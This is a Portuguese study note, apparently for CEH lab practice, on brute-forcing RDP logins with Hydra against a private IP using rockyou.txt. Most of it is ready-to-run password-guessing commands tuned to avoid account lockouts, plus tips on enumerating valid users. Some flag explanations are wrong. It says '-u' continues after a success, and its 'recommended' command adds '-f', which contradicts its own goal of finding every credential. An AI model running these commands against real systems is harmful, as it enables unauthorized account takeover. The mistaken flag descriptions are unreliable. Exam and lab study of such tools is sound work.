# 🎯 Objetivo

Testar **todas as combinações possíveis** em RDP **sem perder credenciais válidas** nem disparar bloqueios.

Comando atual:

```bash
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp
```

Funciona, mas **não é o ideal**.

---

## ⚠️ PROBLEMAS DESSE COMANDO “PURO”

1. Threads padrão podem ser **altas demais**
2. Hydra pode **parar após sucesso**
3. Pouca visibilidade do que está acontecendo
4. RDP responde mal a brute-force agressivo
5. Pode gerar **falso negativo**

---

# ✅ COMANDO OTIMIZADO (RECOMENDADO – CEH)

```bash
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp \
-u \
-V \
-t 4 \
-f
```

Agora vamos destrinchar **cada otimização**.

---

# 🧠 EXPLICAÇÃO DAS OTIMIZAÇÕES

## 🔹 `-u` → continue após sucesso

Por padrão, o Hydra **pode parar o módulo** após encontrar uma credencial válida.

📌 Esse flag garante:

> "continue testando outras combinações"

Essencial quando **sabemos que há mais de uma credencial válida**.

---

## 🔹 `-V` → verbose

Mostra **todas as tentativas**:

```text
[ATTEMPT] user:pass
```

📌 Útil para:

* Diagnóstico
* Ver se está travando
* Ver se está pulando usuários

---

## 🔹 `-t 4` → número de threads

⚠️ **Muito importante para RDP**

| Serviço | Threads recomendadas |
| ------- | -------------------- |
| SSH     | 8–16                 |
| FTP     | 16                   |
| HTTP    | 16–32                |
| **RDP** | **2–4**              |

Mais que isso:

* Reset de conexão
* Timeout
* Hydra “acha” que senha está errada

---

## 🔹 `-f` → stop após encontrar um par (opcional)

⚠️ **Use apenas se você quiser o primeiro resultado**.

Se você quer **TODOS**, **não use** `-f`.

---

# 🔥 COMANDO FINAL (TODAS AS CREDENCIAIS)

```bash
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4
```

---

# ⚡ EXTRA: EVITAR BLOQUEIO (IMPORTANTE EM LABS)

Se o alvo é sensível:

```bash
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 2 -w 5
```

| Flag   | Função                 |
| ------ | ---------------------- |
| `-w 5` | espera 5s por resposta |
| `-t 2` | menos paralelismo      |

---

# 🧠 OTIMIZAÇÃO REAL (ANTES DO HYDRA)

Antes de brute-force, **reduza o escopo**:

### 🔍 Enumerar usuários válidos (se possível)

* SMB
* LDAP
* Kerberos
* RDP NLA banner

Quanto menor `users.txt`, melhor o Hydra funciona.

---

# 🛑 VERDADE IMPORTANTE (nível prova)

> Mesmo com Hydra otimizado, RDP pode aceitar login apenas de contas específicas, portanto apenas um conjunto de credenciais pode ser válido.

---

# 📌 RESUMO FINAL (grave isso)

```text
-L → lista de usuários
-P → lista de senhas
-u → continuar após sucesso
-t 4 → ideal para RDP
-V → debug visual
```
